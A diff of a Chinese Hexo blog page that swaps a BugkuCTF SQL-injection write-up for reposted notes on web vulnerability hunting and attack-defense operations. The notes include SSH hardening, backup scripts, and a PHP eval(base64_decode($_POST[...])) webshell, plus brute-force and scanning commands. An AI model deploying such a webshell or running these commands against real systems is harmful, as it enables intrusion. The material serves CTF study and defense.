@@ -6,20 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>BUGKUCTF-SQL注入2 | try2be</title>
+  <title>web漏洞挖掘与利用 | try2be</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="全都tm过滤了绝望吗？提示 !,!&#x3D;,&#x3D;,+,-,^,% 看见了表单输入，所以应该是post注入吧,用burpsuite抓包, 123456789101112131415POST &#x2F;web2&#x2F;login.php HTTP&#x2F;1.1Host: 123.206.87.240:8007User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0;">
+  <meta name="description" content="web漏洞挖掘与利用(转载)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUGKUCTF-SQL注入2">
-<meta property="og:url" content="http://yoursite.com/2020/01/24/BUGKUCTF-SQL%E6%B3%A8%E5%85%A52/index.html">
+<meta property="og:title" content="web漏洞挖掘与利用">
+<meta property="og:url" content="http://yoursite.com/2020/02/26/web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="try2be">
-<meta property="og:description" content="全都tm过滤了绝望吗？提示 !,!&#x3D;,&#x3D;,+,-,^,% 看见了表单输入，所以应该是post注入吧,用burpsuite抓包, 123456789101112131415POST &#x2F;web2&#x2F;login.php HTTP&#x2F;1.1Host: 123.206.87.240:8007User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0;">
+<meta property="og:description" content="web漏洞挖掘与利用(转载)">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-01-24T07:17:48.000Z">
-<meta property="article:modified_time" content="2020-01-24T07:26:43.160Z">
+<meta property="og:image" content="https://i.imgur.com/L2NPvLO.png">
+<meta property="article:published_time" content="2020-02-26T09:09:30.386Z">
+<meta property="article:modified_time" content="2020-02-26T09:18:43.815Z">
 <meta property="article:author" content="lu2hx0">
-<meta property="article:tag" content="BUGKUCTf">
+<meta property="article:tag" content="转载">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/L2NPvLO.png">
   
     <link rel="alternative" href="/atom.xml" title="try2be" type="application/atom+xml">
   
@@ -153,38 +155,65 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-BUGKUCTF-SQL注入2" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-web漏洞挖掘与利用" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      BUGKUCTF-SQL注入2
+      web漏洞挖掘与利用
     </h1>
   
 
         
-        <a href="/2020/01/24/BUGKUCTF-SQL%E6%B3%A8%E5%85%A52/" class="archive-article-date">
-  	<time datetime="2020-01-24T07:17:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-24</time>
+        <a href="/2020/02/26/web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/" class="archive-article-date">
+  	<time datetime="2020-02-26T09:09:30.386Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-26</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>全都tm过滤了绝望吗？<br>提示 !,!=,=,+,-,^,%</p>
-<p>看见了表单输入，所以应该是post注入吧,用burpsuite抓包,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;web2&#x2F;login.php HTTP&#x2F;1.1</span><br><span class="line">Host: 123.206.87.240:8007</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 19</span><br><span class="line">Origin: http:&#x2F;&#x2F;123.206.87.240:8007</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;123.206.87.240:8007&#x2F;web2&#x2F;index.php</span><br><span class="line">Cookie: PHPSESSID&#x3D;rpaffi7ddqrbv305otnnvu2i6hlj7vt2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">uname&#x3D;11111&amp;passwd&#x3D;111</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r C:\Users\86150\Desktop\2.txt</span><br></pre></td></tr></table></figure>
-<p>查询是否存在注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[WARNING] POST parameter &#39;uname&#39; does not seem to be injectable</span><br><span class="line">[22:15:46] [INFO] testing if POST parameter &#39;passwd&#39; is dynamic</span><br><span class="line">[22:15:46] [WARNING] POST parameter &#39;passwd&#39; does not appear to be dynamic</span><br><span class="line">[22:15:46] [WARNING] heuristic (basic) test shows that POST parameter &#39;passwd&#39; might not be injectable</span><br><span class="line"></span><br><span class="line">[WARNING] POST parameter &#39;passwd&#39; does not seem to be injectable</span><br><span class="line">[22:15:53] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &#39;--level&#39;&#x2F;&#39;--risk&#39; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#39;--tamper&#39; (e.g. &#39;--tamper&#x3D;space2comment&#39;) and&#x2F;or switch &#39;--random-agent&#39;</span><br></pre></td></tr></table></figure>
-<p>wc，怎么回事儿<br>然后我查了一下</p>
-<p><a href="https://www.cnblogs.com/lzlzzzzzz/p/11794713.html" target="_blank" rel="noopener">查阅到这篇文章</a><br>不是post和get，我想是不是HTTP头的注入<br><a href="https://www.cnblogs.com/0nth3way/articles/7093045.html" target="_blank" rel="noopener">查阅到这篇文章</a><br>手工给http头的所有参数加上定位符*再次运行sqlmap<br>然后还是不行，但是过程中有发现数据库类型是Oracle<br>然而并没有什么jb用，这时候回来再看一下这个提示，过滤？！手注？！<br>md，吐了。</p>
-<p>搜了一些wp，发现我tm好像是完全完全走错路了。要手注的。</p>
-<h5 id="新概念"><a href="#新概念" class="headerlink" title="新概念"></a>新概念</h5><p>fuzz testing<br>异或注入(可用于判断哪些字符被过滤):使用^符号(mysql里的xor)来构造playload例如:?id=1’ ^ (length(‘union’)=5)–+，这样来判断union是否被过滤</p>
-<p>罢了罢了，留下这个问题吧</p>
+        <h1 id="web漏洞挖掘与利用-转载"><a href="#web漏洞挖掘与利用-转载" class="headerlink" title="web漏洞挖掘与利用(转载)"></a>web漏洞挖掘与利用(转载)</h1><a id="more"></a>
+
+<h2 id="基础划分："><a href="#基础划分：" class="headerlink" title="基础划分："></a>基础划分：</h2><p>java web —&gt;web漏洞挖掘 web服务器安全检测 web的代码审计 web常见漏洞 web的补丁方法<br>python   —&gt;漏洞利用脚本设计<br>c         —&gt;web服务器的运维 </p>
+<h2 id="web的漏洞挖掘经验"><a href="#web的漏洞挖掘经验" class="headerlink" title="web的漏洞挖掘经验"></a>web的漏洞挖掘经验</h2><h3 id="web的调试神器"><a href="#web的调试神器" class="headerlink" title="web的调试神器"></a>web的调试神器</h3><h3 id="web的漏洞挖掘"><a href="#web的漏洞挖掘" class="headerlink" title="web的漏洞挖掘"></a>web的漏洞挖掘</h3><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><ul>
+<li>一句话木马</li>
+<li>chmod a+x <h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4></li>
+</ul>
+<p>filelocation</p>
+<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>passwd=“$arg3”;</p>
+<p>test”;select form * xxxxxx;</p>
+<p>filelocator pro<br><a href="https://jingyan.baidu.com/article/a17d5285efcbee8098c8f295.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/a17d5285efcbee8098c8f295.html</a></p>
+<h4 id="google-hacker"><a href="#google-hacker" class="headerlink" title="google hacker"></a>google hacker</h4><p><img src="https://i.imgur.com/L2NPvLO.png" alt=""></p>
+<p>出名的漏洞库网站<br>国外<br><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></p>
+<p><a href="http://seclists.org/" target="_blank" rel="noopener">http://seclists.org/</a></p>
+<p><a href="https://cn.0day.today/" target="_blank" rel="noopener">https://cn.0day.today/</a></p>
+<p>国内<br>乌云镜像站<br>Seebug (<a href="https://paper.seebug.org/" target="_blank" rel="noopener">https://paper.seebug.org/</a>)<br><a href="http://0day5.com/" target="_blank" rel="noopener">http://0day5.com/</a></p>
+<p>抓包改包工具<br>BurpSuite<br>代码比较工具<br>BeyondCompare(windows)<br>Kaleidoscope(mac)<br>Webshell 管理工具<br>菜刀</p>
+<p><a href="http://www.httrack.com/" target="_blank" rel="noopener">http://www.httrack.com/</a><br>wget -r -c- p <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a><br>kali 自带的 setoolkit 工具</p>
+<p>Searchsploit (<a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a> 出品)    </p>
+<h3 id="linux运维"><a href="#linux运维" class="headerlink" title="linux运维"></a>linux运维</h3><h4 id="密钥登陆"><a href="#密钥登陆" class="headerlink" title="密钥登陆"></a>密钥登陆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#编辑sshd_config文件</span><br><span class="line">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">#禁用密码验证</span><br><span class="line">PasswordAuthentication no</span><br><span class="line">#启用密钥验证</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">#指定公钥数据库文件</span><br><span class="line">AuthorsizedKeysFile .ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;^PasswordAuthentication.*&#x2F;PasswordAuthentication no&#x2F;g&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;^#RSAAuthentication.*&#x2F;RSAAuthentication yes&#x2F;g&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;^#PubkeyAuthentication.*&#x2F;PubkeyAuthentication yes&#x2F;g&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;^#AuthorizedKeysFile.*&#x2F;AuthorizedKeysFile .ssh\&#x2F;authorized_keys&#x2F;g&quot; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">搜索 SSHD公钥登陆 </span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;mchdba&#x2F;article&#x2F;details&#x2F;52193812</span><br><span class="line"></span><br><span class="line">重启SSH服务前建议多保留一个会话以防不测</span><br><span class="line"></span><br><span class="line">#RHEL&#x2F;CentOS系统</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">#ubuntu系统</span><br><span class="line">service ssh restart</span><br><span class="line"></span><br><span class="line">#debian系统</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;ssh restart</span><br></pre></td></tr></table></figure>
+<p>nmap 扫描 22<br>hydra  -user   -p<br>字典生成工具<br><a href="https://blog.csdn.net/qq_33936481/article/details/51277679" target="_blank" rel="noopener">https://blog.csdn.net/qq_33936481/article/details/51277679</a></p>
+<h4 id="网站源码备份"><a href="#网站源码备份" class="headerlink" title="网站源码备份"></a>网站源码备份</h4><p>远程获取文件<br>scp -r Web1:/var/www/html/ webbak/</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">time&#x3D;&#96;&#x2F;bin&#x2F;date +%F&#96;</span><br><span class="line">bak_file&#x3D;&quot;&#x2F;data&#x2F;backup&#x2F;$time.tar.gz&quot;</span><br><span class="line">webdir&#x3D;&quot;&#x2F;data&#x2F;www&#x2F;&quot;</span><br><span class="line">tar zcvf $bak_file $webdir &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>30 * * * * /bin/bash /data/bak.sh定时执行<br>计划任务<br>crontable -e<br>ctl+o<br>ctl+x</p>
+<h4 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p --single-transaction --all-databases &gt; backup.sql # 所有</span><br><span class="line"></span><br><span class="line">mysqldump -u root -p --single-transaction dataname &gt; dataname.sql	#单个</span><br><span class="line"></span><br><span class="line">mysqldump --skip-lock-tables -uxxxx -pxxxxxx -h 166.111.9.173 -R 数据库名 &gt; .&#x2F;urlevent20180319.sql </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysqldump -h127.0.0.1 -uroot -ppassword database |gzip &gt;$backupDir&#x2F;$database-$today.sql.gz&#96;然后，scp回来。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#备份目录</span><br><span class="line">backupDir&#x3D;&#x2F;home&#x2F;backup&#x2F;database</span><br><span class="line">#mysqlDump</span><br><span class="line">mysqldump&#x3D;&#x2F;usr&#x2F;local&#x2F;mariadb&#x2F;bin&#x2F;mysqldump</span><br><span class="line">host&#x3D;127.0.0.1</span><br><span class="line">username&#x3D;root</span><br><span class="line">password&#x3D;42342342</span><br><span class="line">today&#x3D;&#96;date +%Y%m%d&#96;</span><br><span class="line">#要备份的数据库数组</span><br><span class="line">databases&#x3D;(blog chinese_medicine)</span><br><span class="line"># echo $databaseCount</span><br><span class="line">for database in $&#123;databases[@]&#125;</span><br><span class="line">  do</span><br><span class="line">    echo &#39;开始备份&#39;$database</span><br><span class="line">    $mysqldump -h$host -u$username -p$password $database | gzip &gt; $backupDir&#x2F;$database-$today.sql.gz</span><br><span class="line">    echo &#39;成功备份&#39;$database&#39;到&#39;$backupDir&#x2F;$database-$today.sql.gz</span><br><span class="line">  done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恢复mysql</span><br><span class="line">mysql -uroot -p TEST &lt; bak.sql</span><br></pre></td></tr></table></figure>
+<h4 id="数据库运维"><a href="#数据库运维" class="headerlink" title="数据库运维"></a>数据库运维</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">取消mysql密码认证：</span><br><span class="line">修改my.cnf ，添加 skip-grant-tables</span><br><span class="line"></span><br><span class="line">修改mysql密码</span><br><span class="line">update mysql.user set password&#x3D;PASSWORD(&#39;skyboy&#39;) where user&#x3D;&#39;root&#39; and host&#x3D;&#39;localhost&#39;;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">最好先修改mysql，再修改php。一般不存在需要修改mysql密码的情况。</span><br><span class="line"></span><br><span class="line">禁止数据库的远程连接：</span><br><span class="line"></span><br><span class="line">use mysql;</span><br><span class="line"></span><br><span class="line">update user set host&#x3D;&#39;localhost&#39; where user&#x3D;&#39;root&#39;；</span><br><span class="line"></span><br><span class="line">flush privileges；</span><br><span class="line"></span><br><span class="line">CREATE USER ‘dog’@‘localhost’ IDENTIFIED BY ‘123456’;</span><br><span class="line"></span><br><span class="line">GRANT ALL ON databasename.* TO ‘dog’@‘localhost</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">调整站点配置文件，修改数据库连接的用户名和密码。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Linux服务器权限管理"><a href="#Linux服务器权限管理" class="headerlink" title="Linux服务器权限管理"></a>Linux服务器权限管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">对于非必须可写的目录：</span><br><span class="line">权限设置为755，拥有者设为非www-data用户；从而防止文件被篡改&#x2F;删除。 </span><br><span class="line"></span><br><span class="line">对于必须可写的目录：</span><br><span class="line">根据服务器类型，上一个.htaccess, 或者修改nginx的目录配置文件，去除此路径的脚本执行权限。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对于Nginx：</span><br><span class="line">location ~ &#x2F;mm&#x2F;(data|uploads|templets)&#x2F;*.(php)$ &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br><span class="line">location ~ .php$ &#123;</span><br><span class="line">try_files $uri &#x2F;404.html;</span><br><span class="line">fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">fastcgi_index index.php;</span><br><span class="line">fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">include fastcgi_params;</span><br><span class="line">&#125; </span><br><span class="line">修改完成之后，nginx -S reload</span><br></pre></td></tr></table></figure>
+
+<h4 id="防御脚本"><a href="#防御脚本" class="headerlink" title="防御脚本"></a>防御脚本</h4><p>*waf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通用防御</span><br><span class="line"></span><br><span class="line">php-WAF的批量添加：</span><br><span class="line"></span><br><span class="line">find &#x2F;var&#x2F;www&#x2F;html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s&#x2F;&lt;?php&#x2F;&lt;?php require_once(&#39;&#x2F;tmp&#x2F;waf.php&#39;);n&#x2F;g“</span><br><span class="line"></span><br><span class="line">WAF需要同时具备拦截和抓取流量的作用。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>watch </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$serverList &#x3D; array(</span><br><span class="line">    &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;::1&quot;</span><br><span class="line">);</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line"></span><br><span class="line">foreach ($serverList as $host)&#123;</span><br><span class="line">    if( $ip&#x3D;&#x3D;&#x3D;$host)&#123;</span><br><span class="line">		$a &#x3D; $_POST[&#39;n985de9&#39;];</span><br><span class="line">		if(isset($a)) &#123;</span><br><span class="line">    		eval(base64_decode($a));</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>chandler —&gt;<br>apache —–&gt; </p>
+<h4 id="查看网络拓扑"><a href="#查看网络拓扑" class="headerlink" title="查看网络拓扑"></a>查看网络拓扑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">masscan(一般用这个就好)：</span><br><span class="line">masscan -p 80 172.16.0.0&#x2F;24</span><br><span class="line">masscan -p0-65535 172.16.0.0&#x2F;24 -oJ result.json</span><br><span class="line"></span><br><span class="line">Nmap：</span><br><span class="line">nmap -sn -T4 ip&#x2F;24</span><br><span class="line">nmap -Pn ip&#x2F;24</span><br></pre></td></tr></table></figure>
 
       
 
@@ -219,7 +248,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">BUGKUCTf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">转载</a>
         		</li>
       		
 		</ul>
@@ -275,7 +304,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/01/24/BUGKUCTF-SQL%E6%B3%A8%E5%85%A52/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/02/26/web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -289,18 +318,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/02/04/BUGKUCTF/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          BUGKUCTF
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/01/22/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">墨者学院-SQL注入漏洞测试-布尔盲注</div>
+    <a href="/2020/02/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界web新手练习</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -331,8 +351,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://yoursite.com/2020/01/24/BUGKUCTF-SQL%E6%B3%A8%E5%85%A52/", 
-    sourceId: "BUGKUCTF-SQL注入2",
+    url: "http://yoursite.com/2020/02/26/web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%A9%E7%94%A8/", 
+    sourceId: "web漏洞挖掘与利用",
     productKey: "true",
     target: "cloud-tie-wrapper"
   };
